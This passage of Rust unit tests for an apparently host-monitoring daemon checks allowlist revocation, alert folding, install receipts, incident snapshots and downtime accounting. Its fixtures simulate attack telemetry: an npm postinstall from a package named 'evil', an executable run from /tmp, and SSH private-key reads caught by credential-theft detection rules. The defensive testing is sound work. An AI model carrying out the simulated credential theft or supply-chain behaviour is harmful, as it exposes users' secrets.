                written: util::now_rfc3339(),
                revoked: None,
                accepted_by: None,
            },
        );

        // Make the rewrite fail. `disable_rule` writes through
        // `util::atomic_write` (temp file + rename), so read-only on the FILE
        // changes nothing -- the directory is what has to refuse.
        use std::os::unix::fs::PermissionsExt;
        let parent = path.parent().unwrap().to_path_buf();
        std::fs::set_permissions(&parent, std::fs::Permissions::from_mode(0o555)).unwrap();
        let n = d.revoke_stale_learned_entries();
        std::fs::set_permissions(&parent, std::fs::Permissions::from_mode(0o755)).unwrap();

        assert_eq!(n, 0, "nothing was actually withdrawn");
        assert_eq!(
            d.baseline.learned_entries().len(),
            1,
            "the entry must stay in the retry set while the block is still live"
        );
    }

    #[test]
    fn a_learned_entry_is_revoked_when_its_actor_stops_being_official() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, cfg) = dev_daemon(dir.path());

        // A private copy of the pacman fixture we can mutate.
        let local = dir.path().join("pacman-local");
        let src = Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/pacman-local");
        std::fs::create_dir_all(&local).unwrap();
        for e in std::fs::read_dir(&src).unwrap().flatten() {
            let d2 = local.join(e.file_name());
            std::fs::create_dir_all(&d2).unwrap();
            for f in ["desc", "files"] {
                std::fs::copy(e.path().join(f), d2.join(f)).unwrap();
            }
        }
        d.cfg.paths.pacman_local = local.clone();
        d.provenance = crate::provenance::Classifier::new(
            &local,
            &d.cfg.baseline.trusted_repos,
            &d.homes,
            Box::new(PacmanSl { bin: cfg.paths.pacman.clone() }),
        );
        assert!(d.provenance.classify_path("/usr/bin/restic").provenance.is_official());

        // Learn an entry for it.
        let now = util::unix_secs();
        for day in 0..3u64 {
            d.baseline.observe(&Observation {
                rule: "moat-cred-ssh-private-key-read",
                exe: "/usr/bin/restic",
                parent: "",
                dir: "/home/dan/.ssh",
                severity: "medium",
                severity_base: "medium",
                provenance: "official",
                package: Some("restic 0.18.1-1".into()),
                context: "service",
                rarity: "common",
                suppressed: false,
                demoted: false,
                ts: format!("2026-09-0{}T10:00:00.000Z", day + 1),
                now,
            });
        }
        let entry = d.baseline.learned_entries();
        assert_eq!(entry.len(), 1);
        let t = d.baseline.state.tuples.get(&entry[0].key).unwrap().clone();
        let path = d.cfg.paths.baseline_allowlist();
        crate::allowlist::append_rule(&path, &t.comment("learned"), &t.spec()).unwrap();
        d.reload_allowlist();
        assert_eq!(d.allowlist.len(), 1);

        // Now `restic` is rebuilt from the AUR: same package name, no repo, no
        // validation. A pacman transaction moved the directory's mtime.
        std::fs::write(
            local.join("restic-0.18.1-1/desc"),
            "%NAME%\nrestic\n\n%VERSION%\n0.18.1-1\n\n%VALIDATION%\nnone\n",
        )
        .unwrap();
        d.provenance.refresh_if_changed();
        // Force the mtime check to fire regardless of filesystem granularity.
        d.provenance = crate::provenance::Classifier::new(
            &local,
            &d.cfg.baseline.trusted_repos,
            &d.homes,
            Box::new(PacmanSl { bin: cfg.paths.pacman.clone() }),
        );
        assert_eq!(
            d.provenance.classify_path("/usr/bin/restic").provenance,
            crate::provenance::Provenance::Foreign
        );
        // on_pacman_change only acts on a real mtime move, so drive the check.
        let revoked = d.revoke_stale_learned_entries();
        assert_eq!(revoked, 1);

        let text = std::fs::read_to_string(&path).unwrap();
        assert!(text.contains("# DISABLED"), "{}", text);
        assert!(text.contains("no longer official"), "{}", text);
        d.reload_allowlist();
        assert_eq!(d.allowlist.len(), 0, "the entry stopped matching");
        assert!(d.baseline.learned_entries().is_empty());

        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == crate::rules::BASELINE_REVOKED)
            .expect("a low alert says why");
        assert_eq!(a.severity, "low");
        assert!(a.explain.what.contains("no longer shipped by a trusted repository"));
    }

    /// BASELINE §8: a suppressed alert still folds and still gets its `count`
    /// updates, so the timeline shows one greyed row with a number rather than
    /// a thousand of them — or nothing at all.
    #[test]
    fn dedupe_and_count_updates_still_work_for_suppressed_alerts() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, cfg) = dev_daemon(dir.path());
        std::fs::write(
            cfg.paths.allowlist_dir.join("user.toml"),
            "# expected\n[[rule]]\nname = \"moat-cred-ssh-private-key-read\"\nexe = \"/usr/bin/restic\"\n",
        )
        .unwrap();
        d.reload_allowlist();
        let line = read_line(
            "e-restic",
            700,
            "/usr/bin/restic",
            "backup",
            "",
            "moat-cred-ssh-private-key-read",
            "/home/dan/.ssh/id_ed25519_moat_fixture",
        );
        for _ in 0..5 {
            d.handle_line(&line);
        }
        let alerts: Vec<Alert> = d
            .store
            .load()
            .into_iter()
            .filter(|a| a.rule == "moat-cred-ssh-private-key-read")
            .collect();
        assert_eq!(alerts.len(), 1, "one folded row, not five");
        assert_eq!(alerts[0].count, Some(5), "the count updates still land");
        assert_eq!(alerts[0].suppressed_by.as_deref(), Some("user.toml#1"));
        assert_eq!(d.store.unacked()["high"], 0, "and none of it is counted");
        // Rarity kept learning through all five, suppressed or not.
        assert_eq!(
            d.rarity
                .peek(&Tuple::file("/usr/bin/restic", "/home/dan/.ssh/id_ed25519_moat_fixture", "read"), util::unix_secs())
                .total,
            5
        );
    }

    #[test]
    fn status_carries_the_shapes_the_plugin_builds_against() {
        let dir = tempfile::tempdir().unwrap();
        let (d, _) = dev_daemon(dir.path());
        let s = d.status();
        for k in ["installed_at", "baseline", "proposals", "demoted_rules"] {
            assert!(s.get(k).is_some(), "status missing {}", k);
        }
        let b = &s["baseline"];
        for k in ["learning", "learning_ends", "proposals", "learned", "demoted"] {
            assert!(b.get(k).is_some(), "status.baseline missing {}", k);
        }
        assert!(b["learning"].as_bool().unwrap(), "a fresh install is learning");
        assert!(b["demoted"].is_array());
        assert!(s["proposals"].is_array());
        assert!(s["demoted_rules"].is_array());
        assert!(s["installed_at"].as_str().unwrap().ends_with('Z'));
    }

    #[test]
    fn installed_at_is_read_back_out_of_state_json() {
        let dir = tempfile::tempdir().unwrap();
        let (d, cfg) = dev_daemon(dir.path());
        d.write_state();
        let stamped = d.baseline.state.installed_at;
        // A wiped baseline.json must not restart the window.
        std::fs::remove_file(cfg.paths.state_dir.join("baseline.json")).ok();
        let d2 = {
            let mut c = cfg.clone();
            c.baseline.learning_days = 7;
            Daemon::new(c, &dir.path().join("moat.toml")).unwrap()
        };
        assert_eq!(d2.baseline.state.installed_at, stamped);
    }

    // ------------------------------------------ receipts, incidents, digest

    /// LEARNING §3: one install, one receipt, written when the **root** exits.
    #[test]
    fn a_package_install_writes_exactly_one_receipt_when_its_root_exits() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let t0 = util::rfc3339_of(util::unix_secs());

        // npm -> sh -> node(postinstall), plus a nested npm frame that must not
        // produce a second receipt, and a binary out of /tmp.
        d.handle_line(&format!(
            r#"{{"process_exec":{{"process":{{"exec_id":"r-npm","pid":41201,"uid":1000,"cwd":"/home/dan/proj","binary":"/usr/bin/npm","arguments":"install","start_time":"{}"}}}}}}"#,
            t0
        ));
        d.handle_line(&format!(
            r#"{{"process_exec":{{"process":{{"exec_id":"r-npm2","pid":41210,"uid":1000,"cwd":"/home/dan/proj","binary":"/usr/bin/npm","arguments":"run build","start_time":"{}","parent_exec_id":"r-npm"}}}}}}"#,
            t0
        ));
        d.handle_line(&format!(
            r#"{{"process_exec":{{"process":{{"exec_id":"r-node","pid":41233,"uid":1000,"cwd":"/home/dan/proj","binary":"/usr/bin/node","arguments":"/home/dan/proj/node_modules/evil/setup.mjs","start_time":"{}","parent_exec_id":"r-npm2"}}}}}}"#,
            t0
        ));
        d.handle_line(&format!(
            r#"{{"process_exec":{{"process":{{"exec_id":"r-tmp","pid":41240,"uid":1000,"cwd":"/home/dan/proj","binary":"/tmp/.x9k","arguments":"","start_time":"{}","parent_exec_id":"r-node"}}}}}}"#,
            t0
        ));
        // A credential read inside the install, and a persistence write.
        d.handle_line(r#"{"process_kprobe":{"process":{"exec_id":"r-node","pid":41233,"uid":1000,"binary":"/usr/bin/node","cwd":"/home/dan/proj","parent_exec_id":"r-npm2"},"function_name":"security_file_permission","policy_name":"moat-cred-ssh-private-key-read","args":[{"file_arg":{"path":"/home/dan/.ssh/id_rsa_moat_fixture"}},{"int_arg":4}]},"time":"2026-09-03T16:21:07.000Z"}"#);

        assert_eq!(d.store.receipts().len(), 0, "nothing until the root exits");
        // The nested npm exiting is not the end of the install.
        d.handle_line(r#"{"process_exit":{"process":{"exec_id":"r-npm2","pid":41210,"binary":"/usr/bin/npm"},"status":0}}"#);
        assert_eq!(d.store.receipts().len(), 0, "only the outermost root closes it");

        d.handle_line(r#"{"process_exit":{"process":{"exec_id":"r-npm","pid":41201,"binary":"/usr/bin/npm","arguments":"install"},"status":0}}"#);
        let rs = d.store.receipts();
        assert_eq!(rs.len(), 1, "one install, one receipt");
        let r = &rs[0];
        assert_eq!(r.root_exe, "/usr/bin/npm");
        assert_eq!(r.root_args, "install");
        assert_eq!(r.cwd, "/home/dan/proj");
        assert_eq!(r.exit, 0);
        assert_eq!(r.postinstall_scripts, vec!["evil"], "the node_modules package");
        assert_eq!(r.credential_reads, vec!["/home/dan/.ssh/id_rsa_moat_fixture"]);
        assert_eq!(r.execs_from_tmp, 1);
        assert!(!r.id.is_empty());
        // A receipt is not an alert: it never reaches the badge.
        assert!(!d.store.load().iter().any(|a| a.rule.contains("receipt")));
        assert_eq!(d.receipt_list(10).len(), 1);
    }

    /// LEARNING §4: a high alert is snapshotted, a low one is not, and the
    /// snapshot reaches the record as an update line.
    #[test]
    fn a_high_alert_gets_an_incident_snapshot_and_a_low_one_does_not() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        replay(&mut d);

        let alerts = d.store.load();
        let base = d.incidents_dir();
        for a in &alerts {
            let want = crate::alert::severity_rank(&a.severity) >= 2 && !a.is_suppressed();
            assert_eq!(
                a.incident.is_some(),
                want,
                "{} ({}) incident: {:?}",
                a.rule,
                a.severity,
                a.incident
            );
            if let Some(inc) = &a.incident {
                assert_eq!(inc.dir, base.join(&a.id).display().to_string());
                assert!(base.join(&a.id).join("process.json").exists());
                assert!(base.join(&a.id).join("tree.txt").exists());
                assert!(base.join(&a.id).join("net.txt").exists());
                assert!(base.join(&a.id).join("meta.json").exists());
                assert!(inc.files.iter().any(|f| f.name == "process.json"));
                for f in &inc.files {
                    assert_eq!(f.sha256.len(), 64, "{} has no hash", f.name);
                }
                // tree.txt is the daemon's own view of the chain.
                let tree = std::fs::read_to_string(base.join(&a.id).join("tree.txt")).unwrap();
                assert!(tree.contains(&a.process.exe), "{}", tree);
            }
        }
        assert!(d.incidents_captured > 0);
        assert_eq!(
            crate::incident::count(&base) as u64,
            d.incidents_captured,
            "one directory per capture"
        );
        assert_eq!(d.status()["incidents"], d.incidents_captured);
    }

    /// The threshold is a config key, and `never` is a real off switch.
    #[test]
    fn the_snapshot_threshold_is_configurable() {
        for (min, want) in [("critical", true), ("never", false)] {
            let dir = tempfile::tempdir().unwrap();
            let (mut d, _) = dev_daemon(dir.path());
            d.cfg.incidents.snapshot_min_severity = min.into();
            replay(&mut d);
            let any = d.store.load().iter().any(|a| a.incident.is_some());
            assert_eq!(any, want, "min = {}", min);
            if min == "critical" {
                for a in d.store.load() {
                    if a.incident.is_some() {
                        assert_eq!(a.severity, "critical");
                    }
                }
            }
        }
    }

    /// LEARNING §2: the bundle, and the fact that the daemon writes it and
    /// nothing else.
    #[test]
    fn the_bundle_is_written_next_to_the_snapshot_and_fences_process_strings() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        replay(&mut d);
        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-cred-ssh-private-key-read")
            .unwrap();

        let path = d.write_bundle(&a.id).unwrap();
        assert_eq!(path, d.incidents_dir().join(&a.id).join("bundle.md"));
        let md = std::fs::read_to_string(&path).unwrap();
        assert!(md.contains(&format!("# Moat alert {}", a.id)));
        assert!(md.contains("```DATA"));
        assert!(md.contains("/home/dan/.ssh/id_ed25519_moat_fixture"), "the alerted file is in the bundle");
        assert!(md.contains("## Incident snapshot"), "the snapshot is linked");
        assert!(md.contains("process.json"));
        // The ancestry gets args and cwd back from the live table.
        assert!(md.contains("args: /usr/lib/node_modules/npm/bin/npm-cli.js install") || md.contains("args: install"), "{}", md);
        // A second call is idempotent, and an unknown id is a clear error.
        assert_eq!(d.write_bundle(&a.id).unwrap(), path);
        assert!(d.write_bundle("01NOPE").unwrap_err().contains("no alert"));
    }

    /// LEARNING §5: the daemon computes the digest; it never sends it.
    #[test]
    fn the_digest_counts_the_week_and_persists_its_switch() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, cfg) = dev_daemon(dir.path());
        replay(&mut d);

        let now = util::unix_secs();
        let g = d.digest(now);
        assert!(g.enabled, "on by default");
        assert!(g.due > now);
        let high = d
            .store
            .load()
            .iter()
            .filter(|a| !a.is_suppressed() && a.severity_rank() >= 2)
            .count() as u64;
        assert_eq!(g.summary.incidents, high);
        assert_eq!(g.summary.installs, d.store.receipts().len() as u64);
        assert!(g.summary.text().starts_with("moat: "));
        assert_eq!(d.status()["digest"], true);

        // The off switch lives in state.json, so it survives a restart.
        d.set_digest(false);
        assert_eq!(d.status()["digest"], false);
        assert_eq!(d.status()["digest_enabled"], false);
        let d2 = Daemon::new(cfg.clone(), &dir.path().join("moat.toml")).unwrap();
        assert!(!d2.digest_enabled, "state.json remembers the switch");

        // And a delivery is recorded so a catch-up run does not send twice.
        d.digest_sent(now);
        assert_eq!(d.digest(now).last_sent, now);
        let d3 = Daemon::new(cfg, &dir.path().join("moat.toml")).unwrap();
        assert_eq!(d3.digest_last_sent, now);
    }

    #[test]
    fn access_words() {
        assert_eq!(access_word(Some(4)).unwrap(), "read");
        assert_eq!(access_word(Some(2)).unwrap(), "write");
        assert_eq!(access_word(Some(6)).unwrap(), "read+write");
        assert_eq!(access_word(Some(0)).unwrap(), "mask 0");
        assert!(access_word(None).is_none());
    }
}

#[cfg(test)]
mod downtime_tests {
    use super::split_downtime;

    /// The 2026-09-09 alert, as arithmetic: watched until 5 s before shutdown,
    /// back 38 s after the next boot, 73 minutes powered off in between. Only
    /// the 38 seconds were blind, and 38 is under the alerting floor.
    #[test]
    fn a_reboot_is_mostly_not_a_blind_window() {
        let d = split_downtime(4416, 1_000_000, 995_600, 1_000_038, 0, 0);
        assert_eq!(d.blind, 38);
        assert_eq!(d.powered_off, 4416 - 38);
        assert_eq!(d.suspended, 0);
    }

    /// A laptop asleep overnight: a large wall gap, almost none of it blind.
    #[test]
    fn a_suspend_is_not_a_blind_window() {
        // Same boot (btime older than the heartbeat), and the monotonic clock
        // advanced only 12 s across a 30,000 s wall gap.
        let d = split_downtime(30_000, 500_000, 900_000, 930_000, 4_000, 4_012);
        assert_eq!(d.blind, 12);
        assert_eq!(d.suspended, 30_000 - 12);
        assert_eq!(d.powered_off, 0);
    }

    /// Same boot, awake the whole time: the whole gap is blind. `pkill moatd`
    /// is the case this rule exists for and it must not be explained away.
    #[test]
    fn a_killed_daemon_on_a_running_machine_is_entirely_blind() {
        let d = split_downtime(600, 500_000, 900_000, 900_600, 4_000, 4_600);
        assert_eq!(d.blind, 600);
        assert_eq!(d.suspended, 0);
        assert_eq!(d.powered_off, 0);
    }

    /// A reboot the btime branch did not catch, because `/proc/stat` could not
    /// be read. CLOCK_MONOTONIC reset, so `awake_now` is far BELOW `last_awake`.
    ///
    /// This used to floor at zero through `saturating_sub` and report
    /// `blind: 0, suspended: wall` -- a reboot rendered as a machine that had
    /// merely been asleep, which hid the entire unobserved window. Exactly
    /// backwards from the rule this function documents: not knowing must
    /// over-report a hole, never hide one.
    #[test]
    fn a_missed_reboot_does_not_hide_the_window() {
        let d = split_downtime(4416, 0, 995_600, 1_000_038, 90_000, 38);
        assert_eq!(d.blind, 4416, "a reboot we could not see must not be hidden");
        assert_eq!(d.suspended, 0);
        assert_eq!(d.powered_off, 0);
    }

    /// The same, with a readable btime that is nonetheless useless because no
    /// heartbeat was ever recorded. Falls to the wall gap rather than to zero.
    #[test]
    fn no_heartbeat_falls_back_to_the_wall_gap() {
        let d = split_downtime(4416, 1_000_000, 0, 1_000_038, 90_000, 38);
        assert_eq!(d.blind, 4416);
    }

    /// An old state.json with no `awake` key: nothing better to go on, so the
    /// whole gap is reported blind.
    #[test]
    fn a_state_file_without_awake_over_reports() {
        let d = split_downtime(4416, 0, 995_600, 1_000_038, 0, 12_000);
        assert_eq!(d.blind, 4416);
    }

    /// `blind` can never exceed `wall`, whichever branch produced it -- the
    /// parts have to add up or the sentence the alert prints is nonsense.
    #[test]
    fn the_parts_always_add_up() {
        for (wall, boot, hb, started, la, an) in [
            (4416u64, 1_000_000u64, 995_600u64, 1_000_038u64, 0u64, 0u64),
            (30_000, 500_000, 900_000, 930_000, 4_000, 4_012),
            (600, 500_000, 900_000, 900_600, 4_000, 4_600),
            (4416, 0, 995_600, 1_000_038, 90_000, 38),
            (100, 1_000_000, 995_600, 1_000_500, 0, 0),
        ] {
            let d = split_downtime(wall, boot, hb, started, la, an);
            assert!(d.blind <= d.wall, "blind {} > wall {}", d.blind, d.wall);
            assert_eq!(
                d.blind + d.powered_off + d.suspended,
                d.wall,
                "parts must sum to the wall gap: {:?}",
                d
            );
        }
    }
}
